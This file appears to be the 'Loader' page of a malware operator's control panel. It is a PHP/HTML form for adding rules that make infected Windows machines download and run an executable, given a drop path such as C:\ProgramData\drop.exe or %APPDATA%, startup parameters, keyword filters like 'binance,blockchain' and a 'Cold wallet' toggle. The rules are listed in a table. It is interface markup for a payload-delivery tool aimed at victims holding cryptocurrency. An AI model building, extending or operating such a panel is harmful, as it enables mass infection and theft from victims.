<?php
include("./header.php");



?>


<!-- Page Content-->
<div class="page-content">
    <div class="container">
        <!-- Page-Title -->
        <div class="row">
            <div class="col-sm-12">
                <div class="page-title-box">
                    <div class="row">
                        <div class="col">
                            <h4 class="page-title">Loader</h4>
                            <ol class="breadcrumb">
                                <li class="breadcrumb-item">Rules</li>

                            </ol>
                        </div>
                        <!--end col-->
                    </div>
                    <!--end row-->
                </div>
                <!--end page-title-box-->
            </div>
            <!--end col-->
        </div>
        <!--end row-->
        <!-- end page title end breadcrumb -->
        <div class="row">
            <div class="col-12">
                <div class="card">
                    <!--end card-header-->
					
                    <div class="card-body">
					<form enctype="multipart/form-data" action="includes/loaderactions.php" method="POST">
                        <div class="row">

                            <div class="col-3">
                                <p class="mb-0 text-muted">
                                <div class="form-group">
                                    <label for="useremail">Name:</label>
                                    <input name="nameField" class="form-control" id="useremail" required="" placeholder="Name">
                                </div>
                                </p>
                            </div> <!-- end col -->

                            <div class="col-3">
                                <p class="mb-0 text-muted">
                                <div class="form-group">
                                    <label for="useremail">Load to:</label>
                                    <input name="pathToField" data-toggle="tooltip" data-placement="top" title="Might be&#013;
									%DESKTOP%\&#013;
									%APPDATA%\&#013;
									%LOCALAPPDATA%\&#013;
									%USERPROFILE%\" class="form-control" id="useremail" required="" placeholder="C:\ProgramData\drop.exe">
                                </div>
                                </p>
                            </div> <!-- end col -->
							
							 <div class="col-3">
                                <p class="mb-0 text-muted">
                                <div class="form-group">
                                    <label for="useremail">Parameters:</label>
                                    <input name="paramField" class="form-control" id="useremail" placeholder="-test=1 -test2=2">
                                </div>
                                </p>
                            </div> <!-- end col -->
							
                            <div class="col-3">
                                <p class="mb-0 text-muted">
                                <div class="form-group">
                                    <label for="useremail">Password:</label>
                                    <input name="pwdField" class="form-control" id="useremail" placeholder="binance,blockchain">
                                </div>
                                </p>
                            </div> <!-- end col -->                            
							
							<div class="col-lg-1 d-flex align-items-center">
                                <div class="custom-control custom-switch switch-primary">
                                    <input type="checkbox" name="activeCheck" class="custom-control-input" id="emptyCheckbox" data-parsley-multiple="groups" data-parsley-mincheck="2">
                                    <label class="custom-control-label" for="emptyCheckbox">Active</label>
                                </div>
                            </div>
							
                           <div class="col-lg-2 d-flex align-items-center">
                                <div class="custom-control custom-switch switch-primary">
                                    <input type="checkbox" name="walletCheck" class="custom-control-input" id="emptyCheckbox1" data-parsley-multiple="groups" data-parsley-mincheck="2">
                                    <label class="custom-control-label" for="emptyCheckbox1">Сold wallet</label>
                                </div>
                            </div>
							
							<div class="col-3">
                                <p class="mb-0 text-muted">
                                <div class="form-group">
                                    <label for="userfile">Enter link for file OR upload file:</label>
                                    <input name="linkToFile" class="form-control" id="userfile" placeholder="http://example.com/file.exe">
                                </div>
                                </p>
                            </div>
							
							<div class="col-2">
                                <p class="mb-0 mt-3 text-muted">
                                <div class="form-group">
                                    <label for="useremail"></label>
                                    <input type="file" name="userfile" id="input-file-now" class="dropify">
                                </div>
                                </p>
                            </div> <!-- end col --> 
							
							
							<div class="col-lg-2"></div>
							<div class="col-lg-2 d-flex align-items-center justify-content-end">

								<button type="submit" class="btn btn-md btn-outline-success">Add rule</button>
                                


                            </div>

                            <!-- end col -->

                        </div> <!-- end row -->
					</form>


                            <table class="table  mt-3 dt-responsive nowrap" style="border-collapse: collapse; border-spacing: 0; width: 100%;">
                                <thead>
                                    <tr>
                                        <th>Name</th>
                                        <th>Load to</th>
                                        <th>Startup parameters</th>
                                        <th>Files</th>
                                        <th>Password</th>
										<th style="width: 100px;">Cold wallet</th>
                                        <th style="width: 120px;" class="text-center">Actions</th>
                                        <th style="width: 100px;">Is active</th>
                                        
                                    </tr>
                                </thead>
                                <tbody id="rows">
									<?php
										require_once 'includes/loaderload.php';
										loaderload();
									?>
                                    
                                </tbody>
                            </table>
                            <!--end /table-->

                        
                    </div>
                </div>
            </div>
        </div>

    </div><!-- container -->

    <?php
    include("./footer.php");



    ?>
    <!--end footer-->
</div>
<!-- end page content -->
</div>
<!-- end page-wrapper -->




<!-- jQuery  -->
<script src="assets/js/jquery.min.js"></script>
<script src="assets/js/bootstrap.bundle.min.js"></script>
<script src="assets/js/metismenu.min.js"></script>
<script src="assets/js/waves.js"></script>
<script src="assets/js/feather.min.js"></script>
<script src="assets/js/simplebar.min.js"></script>
<script src="assets/js/moment.js"></script>

<!-- Plugins js -->
<script src="assets/js/daterangepicker.js"></script>
<script src="assets/js/select2.min.js"></script>
<script src="assets/js/bootstrap-colorpicker.min.js"></script>
<script src="assets/js/bootstrap-material-datetimepicker.js"></script>
<script src="assets/js/bootstrap-maxlength.min.js"></script>
<script src="assets/js/jquery.bootstrap-touchspin.min.js"></script>

<script src="assets/js/jquery.forms-advanced.js"></script>

<!-- App js -->
<script src="includes/loaderactions.js"></script>
<script src="assets/js/app.js"></script>

</body>

</html>